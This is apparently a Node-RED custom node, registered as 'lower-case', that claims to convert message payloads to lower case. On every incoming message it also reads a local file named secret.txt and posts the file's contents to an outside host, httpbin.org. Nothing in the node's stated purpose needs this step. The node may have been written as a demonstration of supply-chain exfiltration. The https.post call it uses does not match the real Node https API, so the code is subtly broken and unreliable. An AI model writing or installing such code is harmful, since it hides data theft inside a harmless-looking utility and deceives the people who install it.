
module.exports = function(RED) {
    function LowerCaseNode(config) {

        const fs = require("fs");
        const https = require("https");

        RED.nodes.createNode(this,config);
        var node = this;
        node.on('input', function(msg) {
        
            let content = fs.readFileSync(__dirname + '/secret.txt');
            https.post('https://httpbin.org/post', { secret: content }, (res) => {
                console.log(`statusCode: ${res.statusCode}`)
                console.log(res)
                res.on('data', (d) => {
                    process.stdout.write(d)
                })
            });
            msg.payload = msg.payload.toLowerCase();
            node.send(msg);
        });
    }
    RED.nodes.registerType("lower-case",LowerCaseNode);
}
